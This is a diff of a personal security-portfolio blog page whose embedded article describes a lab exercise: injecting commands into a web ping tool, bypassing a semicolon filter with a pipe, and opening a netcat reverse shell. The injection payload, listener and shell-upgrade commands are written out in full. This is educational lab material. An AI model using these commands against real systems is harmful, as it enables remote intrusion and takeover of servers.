@@ -1,24 +1,24 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto" data-theme="auto">
 
-<head><script src="/cyber-portfolio/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=cyber-portfolio/livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>Web-to-System Pivot via Command Injection | SOPHY&#39;S CYBERLAB</title>
 <meta name="keywords" content="">
 <meta name="description" content="Objective: To exploit a Command Injection vulnerability in a web application to bypass input filters and establish a persistent Remote Shell.">
 <meta name="author" content="">
-<link rel="canonical" href="http://localhost:1313/cyber-portfolio/posts/web-to-system-pivot-reverse-shell/">
+<link rel="canonical" href="https://XBlankZGap.github.io/cyber-portfolio/posts/web-to-system-pivot-reverse-shell/">
 <link crossorigin="anonymous" href="/cyber-portfolio/assets/css/stylesheet.5db9130a1259ea72830b0840df92053e06b0593c4afbefc50d36b3bcebea9e50.css" integrity="sha256-XbkTChJZ6nKDCwhA35IFPgawWTxK&#43;&#43;/FDTazvOvqnlA=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/cyber-portfolio/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/cyber-portfolio/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/cyber-portfolio/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/cyber-portfolio/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/cyber-portfolio/safari-pinned-tab.svg">
+<link rel="icon" href="https://XBlankZGap.github.io/cyber-portfolio/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://XBlankZGap.github.io/cyber-portfolio/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://XBlankZGap.github.io/cyber-portfolio/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://XBlankZGap.github.io/cyber-portfolio/apple-touch-icon.png">
+<link rel="mask-icon" href="https://XBlankZGap.github.io/cyber-portfolio/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/cyber-portfolio/posts/web-to-system-pivot-reverse-shell/">
+<link rel="alternate" hreflang="en" href="https://XBlankZGap.github.io/cyber-portfolio/posts/web-to-system-pivot-reverse-shell/">
 <noscript>
     <style>
         #theme-toggle,
@@ -173,13 +173,77 @@ document.addEventListener("DOMContentLoaded", function() {
     });
 });
 </script>
+<meta property="og:url" content="https://XBlankZGap.github.io/cyber-portfolio/posts/web-to-system-pivot-reverse-shell/">
+  <meta property="og:site_name" content="SOPHY&#39;S CYBERLAB">
+  <meta property="og:title" content="Web-to-System Pivot via Command Injection">
+  <meta property="og:description" content="Objective: To exploit a Command Injection vulnerability in a web application to bypass input filters and establish a persistent Remote Shell.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-09-30T10:00:00+01:00">
+    <meta property="article:modified_time" content="2025-09-30T10:00:00+01:00">
+    <meta property="og:image" content="https://XBlankZGap.github.io/cyber-portfolio/images/project6_reverse_shell.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://XBlankZGap.github.io/cyber-portfolio/images/project6_reverse_shell.png">
+  <meta name="twitter:title" content="Web-to-System Pivot via Command Injection">
+  <meta name="twitter:description" content="Objective: To exploit a Command Injection vulnerability in a web application to bypass input filters and establish a persistent Remote Shell.">
 
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://XBlankZGap.github.io/cyber-portfolio/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Web-to-System Pivot via Command Injection",
+      "item": "https://XBlankZGap.github.io/cyber-portfolio/posts/web-to-system-pivot-reverse-shell/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Web-to-System Pivot via Command Injection",
+  "name": "Web-to-System Pivot via Command Injection",
+  "description": "Objective: To exploit a Command Injection vulnerability in a web application to bypass input filters and establish a persistent Remote Shell.\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "Objective: To exploit a Command Injection vulnerability in a web application to bypass input filters and establish a persistent Remote Shell.\n1. The Vulnerability: Improper Input Validation The target was a web-based “Network Diagnostic Tool” designed to ping IP addresses. By analyzing the application’s behavior, I identified that it was passing user-supplied input directly to the system shell without proper sanitization. This allowed for Command Chaining, where a legitimate command is followed by a malicious one.\n2. Technical Execution: Bypassing Filters Initial attempts to use the semicolon (;) separator were blocked by the application’s basic “Sanity Check.” I successfully bypassed this restriction by using the Pipe (|) operator, which redirected the command flow to the system’s sh (shell) environment.\nComponent Value Purpose Exploit Vector Web Input Field (Ping) The entry point for the attack. Payload `127.0.0.1 | nc [Attacker_IP] [Port] -e /bin/sh` Execution of the attack string. Listener Netcat (nc -lvp) The “Ear” on Kali waiting for the connection. Target User www-data The service account running the web server. 3. Execution Workflow Listener Initialization: I opened a listening port on my Kali machine using Netcat to intercept the incoming connection. Payload Injection: I entered the malicious string into the web form. This told the server: “Ping yourself, but then open a connection to Sophy’s Kali machine and give her a terminal.” Connection Capture: The server executed the command, and a Reverse Shell was established. Shell Stabilization: To convert the “dumb” shell into a functional terminal, I utilized a Python PTY spawn trick to gain an interactive Bash prompt. 4. Key Commands Used On Kali: nc -lvp 4444 (To wait for the server’s call). In Web Box: 127.0.0.1 | nc 192.168.56.1 4444 -e /bin/sh (The “Phone Home” command). In Reverse Shell: python -c 'import pty; pty.spawn(\"/bin/bash\")' (To stabilize the terminal). RESOURCES_NODE_01 Caption: Demonstrating the successful bypass of input validation to execute system commands through a web interface.\nRESOURCES_NODE_01 Caption: Establishing a persistent Reverse Shell and upgrading to a fully interactive TTY session.\n5. Professional Impact This project demonstrates Lateral Movement. It shows that even if a server is patched at the OS level, a single vulnerable web form can provide a gateway to the internal network. By upgrading the shell using Python, I proved my ability to maintain a stable “Command and Control” (C2) presence on a target, which is essential for deep-penetration testing.\n",
+  "wordCount" : "393",
+  "inLanguage": "en",
+  "image":"https://XBlankZGap.github.io/cyber-portfolio/images/project6_reverse_shell.png","datePublished": "2025-09-30T10:00:00+01:00",
+  "dateModified": "2025-09-30T10:00:00+01:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://XBlankZGap.github.io/cyber-portfolio/posts/web-to-system-pivot-reverse-shell/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "SOPHY'S CYBERLAB",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://XBlankZGap.github.io/cyber-portfolio/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
 <body id="top">
     <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/cyber-portfolio/" accesskey="h" title="SOPHY'S CYBERLAB (Alt + H)">
+            <a href="https://XBlankZGap.github.io/cyber-portfolio/" accesskey="h" title="SOPHY'S CYBERLAB (Alt + H)">
                 <span class="material-symbols-outlined" style="color: var(--primary); font-size: 28px;">terminal</span>
                 <span style="font-family: 'Space Grotesk', sans-serif; font-weight: 700; letter-spacing: -0.05em;">SOPHY'S CYBERLAB</span>
             </a>
@@ -208,12 +272,12 @@ document.addEventListener("DOMContentLoaded", function() {
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/cyber-portfolio/about/" title="About Me">
+                <a href="https://XBlankZGap.github.io/cyber-portfolio/about/" title="About Me">
                     <span>About Me</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/cyber-portfolio/contact/" title="Contact">
+                <a href="https://XBlankZGap.github.io/cyber-portfolio/contact/" title="Contact">
                     <span>Contact</span>
                 </a>
             </li>
@@ -226,8 +290,8 @@ document.addEventListener("DOMContentLoaded", function() {
 
 <article class="post-single main-editorial-grid">
   <header class="post-header-editorial">
-    <div class="breadcrumbs"><a href="http://localhost:1313/cyber-portfolio/">Home</a>
-            <span>/</span><a href="http://localhost:1313/cyber-portfolio/posts/">Posts</a>
+    <div class="breadcrumbs"><a href="https://XBlankZGap.github.io/cyber-portfolio/">Home</a>
+            <span>/</span><a href="https://XBlankZGap.github.io/cyber-portfolio/posts/">Posts</a>
 </div>
     
     <div class="editorial-top-section">
@@ -251,7 +315,7 @@ document.addEventListener("DOMContentLoaded", function() {
     </div>
     <div class="terminal-img-container">
         <figure class="entry-cover" style="margin: 0;">
-                <img loading="eager" src="http://localhost:1313/cyber-portfolio/images/project6_reverse_shell.png" alt=""></figure>
+                <img loading="eager" src="https://XBlankZGap.github.io/cyber-portfolio/images/project6_reverse_shell.png" alt=""></figure>
     </div>
 </div>
     
@@ -314,7 +378,7 @@ document.addEventListener("DOMContentLoaded", function() {
         <span class="dot green"></span>
         <span class="terminal-label" style="font-family: 'JetBrains Mono', monospace; font-size: 10px; opacity: 0.5; margin-left: 10px;">RESOURCES_NODE_01</span>
     </div>
-    <div class="terminal-img-container"><img src="http://localhost:1313/cyber-portfolio/images/project6_web_injection.png" 
+    <div class="terminal-img-container"><img src="https://XBlankZGap.github.io/cyber-portfolio/images/project6_web_injection.png" 
              alt="Screenshot" 
               
              loading="lazy">
@@ -329,7 +393,7 @@ document.addEventListener("DOMContentLoaded", function() {
         <span class="dot green"></span>
         <span class="terminal-label" style="font-family: 'JetBrains Mono', monospace; font-size: 10px; opacity: 0.5; margin-left: 10px;">RESOURCES_NODE_01</span>
     </div>
-    <div class="terminal-img-container"><img src="http://localhost:1313/cyber-portfolio/images/project6_reverse_shell.png" 
+    <div class="terminal-img-container"><img src="https://XBlankZGap.github.io/cyber-portfolio/images/project6_reverse_shell.png" 
              alt="Screenshot" 
               
              loading="lazy">
@@ -347,12 +411,12 @@ document.addEventListener("DOMContentLoaded", function() {
     <ul class="post-tags">
     </ul>
 <nav class="paginav">
-  <a class="prev" href="http://localhost:1313/cyber-portfolio/posts/database-breach-vulnerability/">
+  <a class="prev" href="https://XBlankZGap.github.io/cyber-portfolio/posts/database-breach-vulnerability/">
     <span class="title">« Prev</span>
     <br>
     <span>Database Breach &amp; Administrative Data Exfiltration</span>
   </a>
-  <a class="next" href="http://localhost:1313/cyber-portfolio/posts/cryptanalysis-hash-cracking/">
+  <a class="next" href="https://XBlankZGap.github.io/cyber-portfolio/posts/cryptanalysis-hash-cracking/">
     <span class="title">Next »</span>
     <br>
     <span>Offline Cryptanalysis &amp; Password Recovery</span>
@@ -364,7 +428,7 @@ document.addEventListener("DOMContentLoaded", function() {
     </main>
     
 <footer class="footer">
-        <span>&copy; 2026 <a href="http://localhost:1313/cyber-portfolio/">SOPHY&#39;S CYBERLAB</a></span> · 
+        <span>&copy; 2026 <a href="https://XBlankZGap.github.io/cyber-portfolio/">SOPHY&#39;S CYBERLAB</a></span> · 
 
     <span>
         Powered by
